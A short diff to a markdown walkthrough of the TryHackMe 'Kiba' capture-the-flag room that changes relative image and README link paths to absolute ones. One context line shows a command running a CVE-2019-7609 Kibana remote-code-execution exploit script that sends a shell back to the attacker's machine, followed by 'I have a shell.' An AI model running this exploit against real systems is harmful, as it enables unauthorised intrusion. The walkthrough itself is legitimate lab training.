@@ -2,7 +2,7 @@
 
 | Stat | Value |
 | ---------- | -------------------------------------------- |
-| Image | <img src="../../images/write_ups/try_hack_me/kiba/kiba.png" alt="Kiba" width="90"/> |
+| Image | <img src="/images/write_ups/try_hack_me/kiba/kiba.png" alt="Kiba" width="90"/> |
 | Room | Kiba |
 | URL | https://tryhackme.com/room/kiba |
 | Difficulty | Easy |
@@ -154,7 +154,7 @@ $ python3 CVE-2019-7609-kibana-rce.py -u http://target.thm:5601 -host <attack_bo
 
 I have a shell. I'm in!
 
-I follow the [steps here](../../README.md#stable-shell) to get a stable shell.
+I follow the [steps here](/README.md#stable-shell) to get a stable shell.
 
 I run the following to see what users have a home directory:
 
